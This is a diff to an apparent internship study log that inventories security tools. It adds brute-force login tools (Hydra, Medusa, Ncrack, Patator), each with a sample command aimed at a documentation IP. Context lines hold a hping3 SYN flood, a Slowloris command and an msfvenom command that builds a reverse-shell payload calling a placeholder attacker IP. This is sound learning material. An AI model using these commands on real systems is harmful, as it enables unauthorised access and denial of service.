@@ -49,6 +49,10 @@ A running inventory of every tool encountered during the internship, organized b
 | 37 | Metasploit Framework | Offensive Security | Day 11 | Modular exploitation framework with exploits, payloads, and auxiliary modules |
 | 38 | msfconsole | Offensive Security | Day 11 | Primary Metasploit interactive console for attack workflows |
 | 39 | msfvenom | Offensive Security | Day 11 | Payload creation and encoding tool for Metasploit |
+| 40 | Hydra | Offensive Security | Day 12 | Authentication brute-force tool for SSH, FTP, HTTP, and more |
+| 41 | Medusa | Offensive Security | Day 12 | Parallel remote login brute-force tool |
+| 42 | Ncrack | Offensive Security | Day 12 | High-speed network authentication cracker |
+| 43 | Patator | Offensive Security | Day 12 | Flexible brute-force automation tool with custom success matching |
 ---
 
 ## By Category
@@ -62,7 +66,8 @@ A running inventory of every tool encountered during the internship, organized b
 | curl | HTTP request and header inspection | `curl -I <url>` |
 | Nmap | Network discovery and port scanning | `nmap -sV -sC <target>` |
 | Wireshark | Packet capture, filtering, and deep protocol analysis | `wireshark` (GUI) |
-| tshark | CLI packet capture and scripted analysis | `tshark -i eth0 -Y "http"` || hping3 | Custom packet generation and DoS simulation | `sudo hping3 --flood --rand-source -S -p 8080 127.0.0.1` |
+| tshark | CLI packet capture and scripted analysis | `tshark -i eth0 -Y "http"` |
+| hping3 | Custom packet generation and DoS simulation | `sudo hping3 --flood --rand-source -S -p 8080 127.0.0.1` |
 | Slowloris | HTTP connection exhaustion using slow header injection | `slowloris 127.0.0.1:8080 -s 100 -z 10` |
 ### Linux / System
 | Tool | Purpose | Key Command |
@@ -117,8 +122,11 @@ A running inventory of every tool encountered during the internship, organized b
 | VirtualBox | VM hypervisor for lab environments | `VBoxManage startvm <vmname>` |
 | Metasploit Framework | Modular exploitation framework | `msfconsole` |
 | msfconsole | Interactive Metasploit console | `msfconsole` |
+| Hydra | Authentication brute-force tool for SSH, FTP, HTTP, and more | `hydra -l msfadmin -P <pwlist> ssh://192.0.2.10` |
+| Medusa | Parallel remote login brute-force tool | `medusa -h 192.0.2.10 -U <userlist> -P <pwlist> -M ssh` |
+| Ncrack | High-speed network authentication cracker | `ncrack -p ssh,ftp 192.0.2.10` |
+| Patator | Flexible brute-force automation tool with custom success matching | `patator ssh_login host=192.0.2.10 user=FILE0 password=FILE1 0=... 1=...` |
 | msfvenom | Payload generation and encoding | `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f elf -o shell.elf` |
-| Metasploit Framework | Modular exploitation framework | `msfconsole` |
 
 ---
 
